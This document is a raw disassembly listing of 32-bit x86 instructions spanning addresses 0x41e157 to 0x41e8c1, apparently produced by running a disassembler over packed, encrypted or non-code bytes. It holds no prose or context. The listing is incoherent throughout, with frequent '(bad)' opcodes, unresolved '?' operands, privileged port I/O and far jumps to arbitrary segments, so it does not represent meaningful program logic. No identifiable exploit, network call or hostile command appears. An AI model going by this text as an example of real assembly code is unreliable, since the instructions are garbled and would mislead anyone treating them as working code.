  41e157:	fdivr  st(7),st
  41e159:	stc    
  41e15a:	push   esp
  41e15b:	mov    ebp,0x3093e613
  41e160:	inc    edx
  41e161:	inc    ebx
  41e162:	cmp    cl,ch
  41e164:	(bad)  
  41e165:	test   al,0x99
  41e167:	xor    ecx,0xffffffd0
  41e16a:	imul   edi,DWORD PTR [eax+0x1d],0x20
  41e16e:	gs mov bh,0x40
  41e171:	cmp    ebx,edx
  41e173:	inc    ebx
  41e174:	not    BYTE PTR [eax-0x61]
  41e177:	test   DWORD PTR [edi+0x70],0xd2139737
  41e17e:	clc    
  41e17f:	(bad)  
  41e181:	pop    edx
  41e182:	cmc    
  41e183:	popa   
  41e184:	iret   
  41e185:	pop    ebp
  41e186:	aaa    
  41e187:	jle    0x41e126
  41e189:	(bad)  
  41e18a:	outs   dx,BYTE PTR ds:[esi]
  41e18b:	jno    0x41e1a4
  41e18d:	pop    es
  41e18e:	cmp    bh,dl
  41e190:	test   BYTE PTR [edi],dl
  41e192:	and    DWORD PTR [ebp+0x6f6138eb],edi
  41e198:	xchg   BYTE PTR [ecx],ah
  41e19a:	stos   BYTE PTR es:[edi],al
  41e19b:	push   esp
  41e19c:	push   cs
  41e19d:	js     0x41e12e
  41e19f:	repz mov ch,0xff
  41e1a2:	outs   dx,BYTE PTR ds:[esi]
  41e1a3:	and    eax,0x18fae1a4
  41e1a8:	out    dx,eax
  41e1a9:	ret    0xc039
  41e1ac:	jmp    0x41e169
  41e1ae:	xchg   BYTE PTR [ecx-0x2],ah
  41e1b1:	imul   eax,DWORD PTR [ebp-0x39],0x21f5dee2
  41e1b8:	cmp    edx,DWORD PTR [ecx]
  41e1ba:	xor    BYTE PTR ds:0xce90d2de,bl
  41e1c0:	bound  edx,QWORD PTR ds:0xbe4075ff
  41e1c6:	scas   eax,DWORD PTR es:[edi]
  41e1c7:	jmp    0x179a:0xaf4d161b
  41e1ce:	imul   DWORD PTR [ebp+0x5bd13b83]
  41e1d4:	(bad)
  41e1d8:	pop    ds
  41e1d9:	jmp    0xd403:0x689e00d7
  41e1e0:	dec    ebx
  41e1e1:	scas   al,BYTE PTR es:[edi]
  41e1e2:	add    bl,BYTE PTR [esi-0x64]
  41e1e5:	inc    ecx
  41e1e6:	les    ecx,FWORD PTR [ecx-0x644d9e48]
  41e1ec:	cmc    
  41e1ed:	sti    
  41e1ee:	lods   al,BYTE PTR ds:[esi]
  41e1ef:	test   eax,0xe1a00c06
  41e1f4:	mov    esp,DWORD PTR [ebp+edx*1+0x4e9d0cf8]
  41e1fb:	mov    ?,edi
  41e1fd:	jb     0x41e1fe
  41e1ff:	push   0xca1708f2
  41e204:	mov    ah,0x9d
  41e206:	push   es
  41e207:	leave  
  41e208:	inc    edi
  41e209:	mov    ebp,0x8ec8907c
  41e20e:	pop    edi
  41e20f:	and    eax,0x4e45a289
  41e214:	mov    esp,0x479332f8
  41e219:	aad    0x62
  41e21b:	pusha  
  41e21c:	cmp    al,0xef
  41e21e:	add    BYTE PTR [edi+0x55],dh
  41e221:	ret    0xfe59
  41e224:	xor    ch,al
  41e226:	scas   al,BYTE PTR es:[edi]
  41e227:	push   ebp
  41e228:	xor    DWORD PTR [ebp+ecx*1-0x6e],esp
  41e22c:	push   ebp
  41e22d:	(bad)  
  41e22e:	adc    DWORD PTR [esi],edi
  41e230:	or     cl,dl
  41e232:	mov    ah,0x2a
  41e234:	add    DWORD PTR ds:[edx],esi
  41e237:	inc    ebx
  41e238:	mov    edi,esi
  41e23a:	cmp    ch,BYTE PTR [edx+0x2ddeee83]
  41e240:	in     al,dx
  41e241:	out    dx,al
  41e242:	shl    BYTE PTR [esi-0x4f],0xa7
  41e246:	repnz sub dl,ch
  41e249:	dec    ebp
  41e24a:	pop    ebx
  41e24b:	ror    dh,1
  41e24d:	push   DWORD PTR ds:0x92d6ace
  41e253:	shl    BYTE PTR [ecx-0x7405a56],cl
  41e259:	mov    gs,ecx
  41e25b:	xor    eax,0xf5170b41
  41e260:	push   edi
  41e261:	cdq    
  41e262:	add    al,0xe
  41e264:	xor    esp,edi
  41e266:	je     0x41e26a
  41e268:	cmp    al,0xde
  41e26a:	xchg   edx,eax
  41e26b:	arpl   WORD PTR [eax-0x12],si
  41e26e:	lods   al,BYTE PTR ds:[esi]
  41e26f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e270:	std    
  41e271:	enter  0x1e14,0xd1
  41e275:	fmul   st,st(6)
  41e277:	push   ebx
  41e278:	and    dh,ah
  41e27a:	lea    edi,[ebp-0xb]
  41e27d:	pop    es
  41e27e:	ja     0x41e2a2
  41e280:	call   0x365f:0xc47c6010
  41e287:	add    al,0xd9
  41e289:	fimul  WORD PTR [ebx-0x2477ea97]
  41e28f:	sti    
  41e290:	push   ss
  41e291:	dec    esi
  41e292:	push   esp
  41e293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e294:	dec    esi
  41e295:	test   DWORD PTR [edi],edi
  41e297:	xchg   ecx,eax
  41e298:	mov    edi,0x58b8173
  41e29d:	adc    eax,0x6e106517
  41e2a2:	sub    al,0x90
  41e2a4:	jb     0x41e30a
  41e2a6:	jns    0x41e2f0
  41e2a8:	les    ebx,FWORD PTR [eax-0x25b13526]
  41e2ae:	sub    eax,0xfd9a3777
  41e2b3:	std    
  41e2b4:	clc    
  41e2b5:	sbb    ah,0xc6
  41e2b8:	lods   eax,DWORD PTR ds:[esi]
  41e2b9:	sbb    bl,BYTE PTR [ebx]
  41e2bb:	test   eax,0xdf2d31f4
  41e2c0:	adc    al,0x26
  41e2c2:	fistp  DWORD PTR [ebx+edi*1-0x43]
  41e2c6:	mov    dl,0xf7
  41e2c8:	int    0xa3
  41e2ca:	sbb    DWORD PTR [ebp+ebx*1+0x57bfc661],edx
  41e2d1:	and    BYTE PTR [ebx+ebp*8],dl
  41e2d4:	fsub   DWORD PTR [ecx]
  41e2d6:	outs   dx,BYTE PTR ds:[esi]
  41e2d7:	mov    dh,0x53
  41e2d9:	xchg   ebx,eax
  41e2da:	sbb    al,0x2b
  41e2dc:	inc    ecx
  41e2dd:	aaa    
  41e2de:	sti    
  41e2df:	push   esp
  41e2e0:	and    eax,0xd39731cc
  41e2e5:	xor    eax,0x159e2cce
  41e2ea:	nop
  41e2eb:	fst    QWORD PTR [esi]
  41e2ed:	retf   0xdfb9
  41e2f0:	(bad)  
  41e2f1:	mov    dh,0x52
  41e2f3:	dec    ebx
  41e2f4:	aad    0x6
  41e2f6:	or     eax,0x96014947
  41e2fb:	or     al,0x39
  41e2fd:	sahf   
  41e2fe:	jg     0x41e307
  41e300:	fs ret 0x871e
  41e304:	fisttp QWORD PTR [edi-0x7cb31acd]
  41e30a:	cmp    BYTE PTR [edi],dh
  41e30c:	cmp    edi,DWORD PTR [ebx]
  41e30e:	nop
  41e30f:	neg    BYTE PTR [esi-0x70]
  41e312:	inc    edi
  41e313:	adc    ecx,DWORD PTR [eax+edx*4-0x72584c44]
  41e31a:	loope  0x41e300
  41e31c:	or     al,0x24
  41e31e:	outs   dx,BYTE PTR ds:[esi]
  41e31f:	xchg   DWORD PTR [ecx],esp
  41e321:	inc    ebp
  41e322:	inc    ecx
  41e323:	imul   ebx,DWORD PTR [edx+ecx*2+0x39abe1cc],0xffffff89
  41e32b:	or     BYTE PTR ds:0x656782f5,bl
  41e331:	(bad)  
  41e332:	xchg   edx,eax
  41e333:	add    ah,cl
  41e335:	jl     0x41e2df
  41e337:	or     bh,BYTE PTR [esi-0x45]
  41e33a:	cmc    
  41e33b:	int    0xbf
  41e33d:	sub    al,bh
  41e33f:	add    DWORD PTR [edx+0x7dbd654f],edi
  41e345:	pop    es
  41e346:	imul   ecx
  41e348:	test   edi,edi
  41e34a:	cmc    
  41e34b:	mov    bx,di
  41e34e:	pop    es
  41e34f:	in     eax,dx
  41e350:	or     al,0xea
  41e352:	jne    0x41e36e
  41e354:	cli    
  41e355:	mov    eax,ds:0x75a8086b
  41e35a:	push   ss
  41e35b:	push   edx
  41e35c:	add    DWORD PTR [ebx+0x7a],ebp
  41e35f:	push   ebp
  41e360:	add    DWORD PTR [ebp-0x72],eax
  41e363:	test   al,0x60
  41e365:	dec    eax
  41e366:	pop    eax
  41e367:	pop    esi
  41e368:	data16 out dx,al
  41e36a:	iret   
  41e36b:	shl    cl,cl
  41e36d:	jge    0x41e3bd
  41e36f:	(bad)  
  41e371:	inc    eax
  41e372:	or     al,0x23
  41e374:	shr    BYTE PTR [edi+0x39],1
  41e377:	mov    esp,0xeda61dc6
  41e37c:	jg     0x41e3b8
  41e37e:	and    al,0xfc
  41e380:	mov    ecx,0x9e905ff5
  41e385:	inc    esi
  41e386:	push   ss
  41e387:	out    0xad,al
  41e389:	jg     0x41e311
  41e38b:	(bad)  
  41e38d:	imul   esi,esp,0x49c5b85f
  41e393:	popf   
  41e394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e395:	stos   BYTE PTR es:[edi],al
  41e396:	bound  edi,QWORD PTR [edx-0x57]
  41e399:	pop    ds
  41e39a:	sub    BYTE PTR [edx-0x42],al
  41e39d:	pop    ebp
  41e39e:	outs   dx,DWORD PTR ds:[esi]
  41e39f:	jb     0x41e3e0
  41e3a1:	adc    eax,0xbccfbfbb
  41e3a6:	push   edx
  41e3a7:	add    DWORD PTR [ebx+eiz*1-0x3],ecx
  41e3ab:	iret   
  41e3ac:	lds    ebx,FWORD PTR [ebx-0x6fa3086a]
  41e3b2:	pop    eax
  41e3b3:	mov    dl,0x79
  41e3b5:	outs   dx,DWORD PTR gs:[esi]
  41e3b7:	(bad)  
  41e3b8:	out    0x16,eax
  41e3ba:	mov    es,esi
  41e3bc:	dec    edx
  41e3bd:	and    eax,0x7b849b81
  41e3c2:	fbstp  TBYTE PTR [ecx]
  41e3c4:	pop    edi
  41e3c5:	mov    dl,0xe7
  41e3c7:	dec    edx
  41e3c8:	cmp    dl,cl
  41e3ca:	add    BYTE PTR [edx-0x23],0x32
  41e3ce:	(bad)  
  41e3cf:	dec    edi
  41e3d0:	xor    eax,0x39cca7e3
  41e3d5:	xor    BYTE PTR [edi+0x42e9e0e5],al
  41e3db:	mov    ebx,DWORD PTR ds:0x1d59886b
  41e3e1:	fild   DWORD PTR [edx-0xe4342bf]
  41e3e7:	pop    eax
  41e3e8:	inc    ebx
  41e3e9:	mov    DWORD PTR [ebx-0x5d],ecx
  41e3ec:	popa   
  41e3ed:	adc    BYTE PTR [ebx],dl
  41e3ef:	call   0xefd58b51
  41e3f4:	lock mov DWORD PTR [edi-0x76b19c83],edx
  41e3fb:	cmp    al,0x6d
  41e3fd:	pusha  
  41e3fe:	cmc    
  41e3ff:	sti    
  41e400:	adc    DWORD PTR [eax+0x5dab0fb6],esp
  41e406:	lds    eax,FWORD PTR [edx+0x6ee59d2d]
  41e40c:	cmp    cl,ah
  41e40e:	sbb    DWORD PTR [ecx+0x1252b716],ebx
  41e414:	iret   
  41e415:	mov    edx,0x7e855ac6
  41e41a:	in     eax,dx
  41e41b:	adc    esi,eax
  41e41d:	and    BYTE PTR [edx+0x26],bh
  41e420:	or     ch,BYTE PTR [ebp+0x1c]
  41e423:	dec    edi
  41e424:	cmp    ch,BYTE PTR fs:[ecx]
  41e427:	shr    DWORD PTR [edi],cl
  41e429:	aam    0x5
  41e42b:	std    
  41e42c:	push   edi
  41e42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e42e:	sbb    cl,dh
  41e430:	outs   dx,DWORD PTR ds:[esi]
  41e431:	imul   esp,esi,0x95e97b46
  41e437:	cmp    esp,esp
  41e439:	pop    ebx
  41e43a:	addr16 inc edx
  41e43c:	add    edx,DWORD PTR [esi+0x47]
  41e43f:	mov    ss,WORD PTR [ebx+0xd4fec2d]
  41e445:	scas   eax,DWORD PTR es:[edi]
  41e446:	(bad)  
  41e447:	outs   dx,BYTE PTR ds:[esi]
  41e448:	ret    0xb511
  41e44b:	shl    ebx,1
  41e44d:	cwde   
  41e44e:	stos   BYTE PTR es:[edi],al
  41e44f:	sub    cl,BYTE PTR [edi+0x13342e01]
  41e455:	div    DWORD PTR [eax+0x44]
  41e458:	ja     0x41e42e
  41e45a:	mov    ch,0x84
  41e45c:	or     eax,0x7e6f7112
  41e461:	or     eax,0x627acc69
  41e466:	cmc    
  41e467:	mov    bl,0xfb
  41e469:	in     al,0x43
  41e46b:	add    BYTE PTR [eax+0x3b],al
  41e46e:	scas   al,BYTE PTR es:[edi]
  41e46f:	add    edi,esp
  41e471:	sub    dh,ch
  41e473:	mov    cs,WORD PTR [eax+0x1]
  41e476:	js     0x41e46d
  41e478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e479:	fistp  WORD PTR [ebp-0x7c9799ef]
  41e47f:	mov    WORD PTR [edi+0x671f29c],?
  41e485:	scas   eax,DWORD PTR es:[edi]
  41e486:	mov    ebx,0x24cb5ebe
  41e48b:	add    BYTE PTR [esi],bl
  41e48d:	dec    ebx
  41e48e:	hlt    
  41e48f:	pop    ss
  41e490:	jae    0x41e4bf
  41e492:	push   ecx
  41e493:	xchg   esp,eax
  41e494:	cmp    ch,BYTE PTR [ecx]
  41e496:	call   0xde2d:0xfa51ca6
  41e49d:	aam    0x82
  41e49f:	mov    edi,0x43583d34
  41e4a4:	test   eax,0xfb05f032
  41e4a9:	fstp   DWORD PTR [edi+0x57]
  41e4ac:	push   ebx
  41e4ad:	ret    
  41e4ae:	or     dl,ch
  41e4b0:	xor    eax,0xdd8349e8
  41e4b5:	sbb    al,0x5d
  41e4b7:	std    
  41e4b8:	push   es
  41e4b9:	fimul  DWORD PTR [edi+0x1194402f]
  41e4bf:	je     0x41e53f
  41e4c1:	sbb    al,0x33
  41e4c3:	dec    eax
  41e4c4:	popf   
  41e4c5:	stos   BYTE PTR es:[edi],al
  41e4c6:	jg     0x41e4f7
  41e4c8:	mov    WORD PTR [eax-0x2a],cs
  41e4cb:	adc    eax,0x5004fc2a
  41e4d0:	add    ebp,DWORD PTR [eax+0x18]
  41e4d3:	inc    ebp
  41e4d4:	jg     0x41e4f6
  41e4d6:	xor    eax,0x3131ec0f
  41e4db:	push   0x430368ad
  41e4e0:	xlat   BYTE PTR ds:[ebx]
  41e4e1:	fstp   DWORD PTR [ecx-0x6c]
  41e4e4:	or     ecx,DWORD PTR [edx+eax*2]
  41e4e7:	mov    eax,ds:0x9c0dc119
  41e4ec:	sub    edx,esi
  41e4ee:	inc    ebp
  41e4ef:	cli    
  41e4f0:	repnz mov ds:0xc5c9f9db,eax
  41e4f6:	add    eax,0x7be4fd59
  41e4fb:	mov    cl,0xe7
  41e4fd:	int    0x4d
  41e4ff:	mov    al,ds:0xcce91514
  41e504:	mov    ah,ch
  41e506:	popf   
  41e507:	xchg   ebp,eax
  41e508:	xchg   edi,eax
  41e509:	xchg   DWORD PTR [esi],eax
  41e50b:	mov    edi,0x5bd89954
  41e510:	inc    eax
  41e511:	xor    DWORD PTR ds:0x59c377,esp
  41e517:	retf   
  41e518:	cmp    BYTE PTR [eax],0xa2
  41e51b:	fsubp  st(3),st
  41e51d:	(bad)  
  41e51e:	shr    DWORD PTR [esi],1
  41e520:	push   edx
  41e521:	mov    dl,cl
  41e523:	sbb    eax,0x716183bf
  41e528:	stos   DWORD PTR es:[edi],eax
  41e529:	scas   al,BYTE PTR es:[edi]
  41e52a:	daa    
  41e52b:	in     al,dx
  41e52c:	mov    dh,0xe8
  41e52e:	dec    esp
  41e52f:	sbb    bl,BYTE PTR [eax]
  41e531:	adc    DWORD PTR [esi+0x2c9b664c],edx
  41e537:	aam    0x38
  41e539:	cmp    al,0x3
  41e53b:	dec    ebp
  41e53c:	dec    eax
  41e53d:	cmp    ebx,DWORD PTR [ecx]
  41e53f:	sti    
  41e540:	mov    ds,WORD PTR [eax]
  41e542:	loopne 0x41e572
  41e544:	aam    0xde
  41e546:	arpl   WORD PTR [ecx-0x18],dx
  41e549:	in     al,dx
  41e54a:	inc    ebp
  41e54b:	jmp    0x41e5b1
  41e54d:	cmp    ah,BYTE PTR [esi+eax*2-0x7ffea860]
  41e554:	inc    edx
  41e555:	mov    dh,0x45
  41e557:	fst    QWORD PTR [ecx-0x6162c9cb]
  41e55d:	mov    BYTE PTR [edi+0x66],dl
  41e560:	dec    esp
  41e561:	adc    BYTE PTR [esi],ah
  41e563:	pop    es
  41e564:	into   
  41e565:	je     0x41e52a
  41e567:	xchg   esi,eax
  41e568:	adc    dh,BYTE PTR ds:0x66a242b5
  41e56e:	dec    esp
  41e56f:	mov    edi,0x9053f2db
  41e574:	pop    ebp
  41e575:	jmp    0x77be3063
  41e57a:	psubsw mm1,QWORD PTR [esp+ebx*2-0x40febed0]
  41e582:	pusha  
  41e583:	sub    cl,ch
  41e585:	dec    ecx
  41e586:	xlat   BYTE PTR ds:[ebx]
  41e587:	xchg   ecx,eax
  41e588:	or     eax,0x12ab15aa
  41e58d:	sub    esp,DWORD PTR [edi+0x4b]
  41e590:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41e592:	sub    BYTE PTR [edi+esi*1+0xb0aed6e],dl
  41e599:	icebp  
  41e59a:	or     bh,BYTE PTR [edi-0x68]
  41e59d:	sahf   
  41e59e:	mov    eax,ds:0x91a764ad
  41e5a3:	cmp    al,0x48
  41e5a5:	mov    bh,0xcd
  41e5a7:	sub    al,BYTE PTR [ebx]
  41e5a9:	add    eax,DWORD PTR [esi+0x486577c2]
  41e5af:	aad    0xee
  41e5b1:	jbe    0x41e562
  41e5b3:	pop    esi
  41e5b4:	cli    
  41e5b5:	jbe    0x41e574
  41e5b7:	xchg   ebp,eax
  41e5b8:	or     DWORD PTR [esi-0x36],esp
  41e5bb:	jle    0x41e554
  41e5bd:	cmp    ah,BYTE PTR [eax-0x1f]
  41e5c0:	or     al,0xb5
  41e5c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5c3:	daa    
  41e5c4:	dec    ebp
  41e5c5:	sbb    DWORD PTR [esi-0x6cdce470],ebp
  41e5cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5cc:	fld    TBYTE PTR [edx]
  41e5ce:	js     0x41e5c5
  41e5d0:	in     al,dx
  41e5d1:	mov    bl,0x7b
  41e5d3:	dec    edi
  41e5d4:	clc    
  41e5d5:	pop    ebp
  41e5d6:	add    esi,ebx
  41e5d8:	sbb    DWORD PTR [eax+ebp*4],0x87ef4286
  41e5df:	or     al,0x17
  41e5e1:	push   cs
  41e5e2:	cwde   
  41e5e3:	mov    esi,0x35d2b387
  41e5e8:	push   ss
  41e5e9:	push   0x419c3183
  41e5ee:	stos   DWORD PTR es:[edi],eax
  41e5ef:	fiadd  WORD PTR [esi]
  41e5f1:	mov    edx,0x72bc0ef
  41e5f6:	mov    bl,0x90
  41e5f8:	cmp    eax,0x33ba9f0a
  41e5fd:	stc    
  41e5fe:	mov    edx,0xfc69640a
  41e603:	fidiv  WORD PTR [ecx+0x30bdd48f]
  41e609:	jae    0x41e634
  41e60b:	je     0x41e668
  41e60d:	pop    ebx
  41e60e:	adc    DWORD PTR [ebp+0x6d],edi
  41e611:	jp     0x41e68a
  41e613:	into   
  41e614:	mul    DWORD PTR [ebp-0x2a]
  41e617:	sub    al,BYTE PTR [ecx+0x1dfd82a0]
  41e61d:	(bad)
  41e621:	xor    DWORD PTR [esi+0x5b1473ab],eax
  41e627:	stos   DWORD PTR es:[edi],eax
  41e628:	inc    eax
  41e629:	or     ch,BYTE PTR [ebx+eiz*8-0x25319901]
  41e630:	push   0x627d451
  41e635:	pop    ebp
  41e636:	push   cs
  41e637:	cmp    eax,0x2d5dac9c
  41e63c:	dec    eax
  41e63d:	sub    eax,0x84d26608
  41e642:	jbe    0x41e6aa
  41e644:	lock aas 
  41e646:	cmc    
  41e647:	(bad)  
  41e648:	in     eax,0x25
  41e64a:	or     ch,bl
  41e64c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e64d:	xchg   ebx,eax
  41e64e:	xor    esi,DWORD PTR [esi]
  41e650:	dec    edi
  41e651:	mul    ch
  41e653:	pop    ebp
  41e654:	pop    edx
  41e655:	mov    esp,0x135015ae
  41e65a:	loop   0x41e66f
  41e65c:	lods   eax,DWORD PTR ds:[esi]
  41e65d:	jle    0x41e6ba
  41e65f:	adc    eax,0x54d604c8
  41e664:	push   ebp
  41e665:	mov    ch,0x87
  41e667:	fsubr  DWORD PTR [ecx+0x337f9b2c]
  41e66d:	cmp    ah,BYTE PTR [edx+0x51]
  41e670:	mov    ch,BYTE PTR [ebx-0x5fc07a4]
  41e676:	(bad)  
  41e677:	hlt    
  41e678:	jg     0x41e663
  41e67a:	test   DWORD PTR [ebx-0x2d],0xb26ee6e6
  41e681:	xchg   BYTE PTR [esi+ebx*4+0x3d],dh
  41e685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e686:	pop    ss
  41e687:	pop    ecx
  41e688:	push   ss
  41e689:	jmp    0x41e61c
  41e68b:	pop    edx
  41e68c:	mov    ecx,0x63ff7d70
  41e691:	sub    DWORD PTR [eax-0x5608592f],edi
  41e697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e698:	cwde   
  41e699:	add    ch,BYTE PTR [ecx]
  41e69b:	mov    bl,0x5
  41e69d:	mov    esp,0x99768663
  41e6a2:	jge    0x41e69d
  41e6a4:	add    eax,0x6df86fe
  41e6a9:	adc    DWORD PTR [esp+edx*2],ebp
  41e6ac:	ins    DWORD PTR es:[edi],dx
  41e6ad:	push   ds
  41e6ae:	jbe    0x41e64f
  41e6b0:	or     al,bh
  41e6b2:	mov    edx,0x40800adf
  41e6b7:	fist   DWORD PTR [eax+ebx*8-0x174efd49]
  41e6be:	inc    esp
  41e6bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6c0:	repz test BYTE PTR [edi],0xbe
  41e6c4:	add    dh,BYTE PTR [ebp-0x71]
  41e6c7:	cmp    al,0xc8
  41e6c9:	call   0xb6e1:0x113ffeda
  41e6d0:	sbb    al,0xdb
  41e6d2:	push   esp
  41e6d3:	and    dh,BYTE PTR [ecx-0x5e]
  41e6d6:	add    bl,bl
  41e6d8:	lahf   
  41e6d9:	mov    ds:0x9c59faa7,eax
  41e6de:	cdq    
  41e6df:	loope  0x41e6b6
  41e6e1:	nop
  41e6e2:	xchg   DWORD PTR [ecx+0x4266f12f],edx
  41e6e8:	pop    ds
  41e6e9:	inc    edx
  41e6ea:	shld   ebx,eax,0xd4
  41e6ee:	ja     0x41e6ae
  41e6f0:	aas    
  41e6f1:	mov    al,0xc2
  41e6f3:	mov    ecx,0xdbde370a
  41e6f8:	shr    DWORD PTR [ebp+0x40],0xdc
  41e6fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6fd:	jo     0x41e74d
  41e6ff:	int    0xd0
  41e701:	mov    esp,0x4f29d714
  41e706:	xor    edi,DWORD PTR [esi-0x58]
  41e709:	icebp  
  41e70a:	repnz mov dl,bh
  41e70d:	retf   0xd937
  41e710:	test   DWORD PTR [edi+0x402636fc],esp
  41e716:	stc    
  41e717:	inc    ecx
  41e718:	aam    0xcc
  41e71a:	xchg   edx,eax
  41e71b:	pop    ecx
  41e71c:	or     esi,DWORD PTR [edi+eiz*1]
  41e71f:	jmp    0x41e6f3
  41e721:	push   cs
  41e722:	shr    BYTE PTR [edx],cl
  41e724:	fcmovbe st,st(5)
  41e726:	aas    
  41e727:	jbe    0x41e78f
  41e729:	stos   DWORD PTR es:[edi],eax
  41e72a:	xchg   esi,eax
  41e72b:	lods   al,BYTE PTR ds:[esi]
  41e72c:	cld    
  41e72d:	inc    eax
  41e72e:	jno    0x41e724
  41e730:	rcr    BYTE PTR [eax],0xdd
  41e733:	xchg   ebp,eax
  41e734:	outs   dx,DWORD PTR ds:[esi]
  41e735:	mov    ds,ebx
  41e737:	popa   
  41e738:	int    0x68
  41e73a:	and    BYTE PTR [eax+0x5b],dl
  41e73d:	imul   DWORD PTR ds:0x6cc113b
  41e743:	outs   dx,DWORD PTR ds:[esi]
  41e744:	outs   dx,DWORD PTR ds:[esi]
  41e745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e746:	call   0x5eaa:0xa1085711
  41e74d:	cld    
  41e74e:	out    0x6d,eax
  41e750:	js     0x41e778
  41e752:	pusha  
  41e753:	and    al,0x8c
  41e755:	xchg   esi,eax
  41e756:	(bad)  
  41e757:	inc    edx
  41e758:	clc    
  41e759:	mov    ds:0x6b6431c6,eax
  41e75e:	sub    al,0xf7
  41e760:	ret    0x81a1
  41e763:	inc    ecx
  41e764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e765:	add    ebp,ecx
  41e767:	mov    bh,0xd9
  41e769:	push   edx
  41e76a:	pop    eax
  41e76b:	cmp    eax,0x450becfd
  41e770:	push   ds
  41e771:	mov    ecx,0x2e1d786a
  41e776:	inc    esi
  41e777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e778:	add    DWORD PTR [ecx+0x30],ecx
  41e77b:	jns    0x41e769
  41e77d:	dec    esp
  41e77e:	mov    ebp,DWORD PTR [edi+0x3e73f181]
  41e784:	in     eax,dx
  41e785:	or     BYTE PTR [ebp-0x57ebce17],0x58
  41e78c:	adc    ebx,eax
  41e78e:	sbb    al,bh
  41e790:	ret    
  41e791:	fwait
  41e792:	sbb    al,0xfe
  41e794:	jmp    0xf792:0xce8c4d8a
  41e79b:	cld    
  41e79c:	sbb    eax,0x34223bb6
  41e7a1:	(bad)  
  41e7a2:	jmp    0x41e80f
  41e7a4:	jnp    0x41e7c2
  41e7a6:	push   0x9e106b8c
  41e7ab:	and    edi,DWORD PTR [edx-0x58129f68]
  41e7b1:	test   eax,0x5bf48676
  41e7b6:	fisttp QWORD PTR [eax-0x2]
  41e7b9:	dec    DWORD PTR [ebx+ecx*4+0x12246237]
  41e7c0:	jno    0x41e7ce
  41e7c2:	xor    eax,0x80a199ec
  41e7c7:	xchg   DWORD PTR [edx-0x2e9bedc3],esp
  41e7cd:	dec    edi
  41e7ce:	xchg   esi,eax
  41e7cf:	es jb  0x41e7b0
  41e7d2:	test   esi,ebx
  41e7d4:	push   ds
  41e7d5:	shl    BYTE PTR ds:0xe84ae984,0xd7
  41e7dc:	cmp    bh,dh
  41e7de:	data16 lods al,BYTE PTR ds:[esi]
  41e7e0:	xchg   ebx,eax
  41e7e1:	mov    ebx,ebx
  41e7e3:	xchg   edi,eax
  41e7e4:	jno    0x41e79c
  41e7e6:	or     BYTE PTR [esi-0x66],bh
  41e7e9:	dec    ebx
  41e7ea:	mov    eax,0xeecc2bad
  41e7ef:	mov    bh,0xf9
  41e7f1:	pop    ebx
  41e7f2:	(bad)  
  41e7f3:	pop    edx
  41e7f4:	mov    cl,0x4e
  41e7f6:	out    dx,al
  41e7f7:	mov    eax,ds:0x7400e52d
  41e7fc:	lds    ecx,FWORD PTR [ebp-0x6e]
  41e7ff:	cs es hlt 
  41e802:	sbb    BYTE PTR [eax],dh
  41e804:	(bad)  
  41e805:	bound  ecx,QWORD PTR [ecx+0x2]
  41e808:	retf   0xa120
  41e80b:	daa    
  41e80c:	in     eax,0xbf
  41e80e:	test   DWORD PTR [edx+0x953e768],ebx
  41e814:	push   ecx
  41e815:	cwde   
  41e816:	inc    eax
  41e817:	pusha  
  41e818:	cmp    esp,edx
  41e81a:	sbb    DWORD PTR [edi+edx*1+0x5a],edx
  41e81e:	stos   DWORD PTR es:[edi],eax
  41e81f:	scas   al,BYTE PTR es:[edi]
  41e820:	and    BYTE PTR [esi-0xa],0xbb
  41e824:	xor    bh,BYTE PTR [eax-0x5b64b8b2]
  41e82a:	mov    ds:0x8d50ff41,eax
  41e82f:	dec    edx
  41e830:	xchg   ebp,esp
  41e832:	(bad)
  41e836:	sbb    al,0xbe
  41e838:	push   cs
  41e839:	and    ecx,esi
  41e83b:	vpavgw ymm6,ymm7,YMMWORD PTR [ebx-0xa32263e]
  41e843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e844:	pop    esp
  41e845:	test   DWORD PTR ds:0x3907e101,edi
  41e84b:	movsx  ebx,WORD PTR [edx-0x3f2b4661]
  41e852:	cld    
  41e853:	loop   0x41e814
  41e855:	ret    
  41e856:	pop    ebx
  41e857:	dec    ebx
  41e858:	sbb    eax,0xb5595169
  41e85d:	stc    
  41e85e:	mov    ebp,0xff7d50b2
  41e863:	mov    edx,0xd3e88f8e
  41e868:	out    dx,eax
  41e869:	call   0x67d:0x49ede30f
  41e870:	jg     0x41e8ee
  41e872:	shl    DWORD PTR [ebx+esi*4-0x5],cl
  41e876:	jnp    0x41e8ba
  41e878:	adc    ch,BYTE PTR ds:0x23e92d5a
  41e87e:	dec    esp
  41e87f:	push   0xdc909cdb
  41e884:	or     BYTE PTR [ecx+0x4b],dl
  41e887:	aam    0x21
  41e889:	icebp  
  41e88a:	call   0xca96:0xe5f96e62
  41e891:	mov    esp,0x691adfe6
  41e896:	cmp    al,BYTE PTR [edx-0x2f3fd176]
  41e89c:	add    cl,BYTE PTR ds:0x9f7bffa
  41e8a2:	xor    al,0xc2
  41e8a4:	arpl   dx,bx
  41e8a6:	pop    ebx
  41e8a7:	(bad)  
  41e8a8:	pop    ds
  41e8a9:	jge    0x41e82f
  41e8ab:	out    dx,eax
  41e8ac:	and    DWORD PTR [eax-0x7297ff98],esp
  41e8b2:	fnstcw WORD PTR [esi+0x51]
  41e8b5:	ret    0x26d8
  41e8b8:	popf   
  41e8b9:	push   es
  41e8ba:	retf   
  41e8bb:	retf   0xf788
  41e8be:	repz cmp al,0x86
  41e8c1:	in     eax,0x74
